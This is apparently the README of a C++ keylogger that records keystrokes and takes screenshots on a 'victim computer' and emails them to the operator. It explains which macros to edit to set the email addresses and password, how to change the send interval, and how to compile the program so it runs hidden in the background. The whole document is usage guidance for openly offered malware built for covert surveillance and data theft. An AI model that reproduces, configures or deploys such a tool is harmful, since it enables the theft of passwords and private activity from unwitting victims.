# Keylogger v1.0
This KeyLogger is written with C++ it will allow you to capture the keyboard clicks and screenshot from your victim computer and sent them in an email, the screenshot part is written with python the c++ script who will create that script and execute it every 2 minutes

## How to use:

change this macros:
```
#define X_EM_TO   "toEmail@gmail.com" //email that will recieve your files
#define X_EM_FROM "yourEmail@gmail.com" //your email
#define X_EM_PASS "password" // your password
```
in the SendMail module (SendMail.h)

o change the time within the emails will sent change this this values line 34 in
```
Timer MailTimer(TimerSendMail,<<Time in Milliseconds>>,Timer::Infinite);
```

compile it with :
```
g++ -std=c++11 -mwindows main.cpp & a
```
and it will run in the background (to stop it kill it from task manager)